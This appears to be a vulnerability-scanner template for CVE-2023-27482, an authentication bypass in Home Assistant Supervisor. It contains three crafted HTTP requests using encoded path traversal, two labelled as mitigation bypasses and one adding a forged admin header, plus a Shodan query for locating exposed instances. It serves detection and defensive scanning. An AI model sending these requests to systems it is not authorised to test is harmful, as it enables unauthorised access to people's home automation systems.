http:
- matchers:
  - condition: and
    type: word
    words:
    - '"slug":'
    - '"name":'
    - '"ip_address"'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /api/hassio/app/.%252e/supervisor/info HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /api/hassio/app/.%09./supervisor/info HTTP/1.1 # Mitigation bypass 1

    Host: {{Hostname}}

    '
  - 'GET /api/hassio_ingress/.%09./supervisor/info HTTP/1.1 # Mitigation bypass 2

    Host: {{Hostname}}

    X-Hass-Is-Admin:1

    '
  stop-at-first-match: true
id: CVE-2023-27482
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:home-assistant:home-assistant:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-27482
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-287
    epss-percentile: 0.93017
    epss-score: 0.06421
  description: 'Home Assistant Supervisor is an open source home automation tool.
    A remotely exploitable vulnerability bypassing authentication for accessing the
    Supervisor API through Home Assistant has been discovered.This impacts all Home
    Assistant installation types that use the Supervisor 2023.01.1 or older. Installation
    types, like Home Assistant Container (for example Docker), or Home Assistant Core
    manually in a Python environment, are not affected.

    '
  impact: 'An attacker can bypass authentication and gain unauthorized access to the
    Home Assistant Supervisor, potentially leading to further compromise of the system.

    '
  metadata:
    max-request: 3
    product: home-assistant
    shodan-query: title:"Home Assistant"
    vendor: home-assistant
    verified: true
  name: Home Assistant Supervisor - Authentication Bypass
  reference:
  - https://www.elttam.com/blog/pwnassistant/
  - https://github.com/elttam/publications/blob/master/writeups/home-assistant/supervisor-authentication-bypass-advisory.md
  - https://www.home-assistant.io/blog/2023/03/08/supervisor-security-disclosure/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-27482
  - https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25
  - https://xz.aliyun.com/t/12572
  remediation: 'The issue has been mitigated and closed in Supervisor version 2023.03.1,
    which has been rolled out to all affected installations via the auto-update feature
    of the Supervisor. This rollout has been completed at the time of publication
    of this advisory. Home Assistant Core 2023.3.0 included mitigation for this vulnerability.
    Upgrading to at least that version is thus advised. In case one is not able to
    upgrade the Home Assistant Supervisor or the Home Assistant Core application at
    this time, it is advised to not expose your Home Assistant instance to the internet.

    '
  severity: critical
  tags: cve2023,cve,homeassistant,auth-bypass,rce,home-assistant
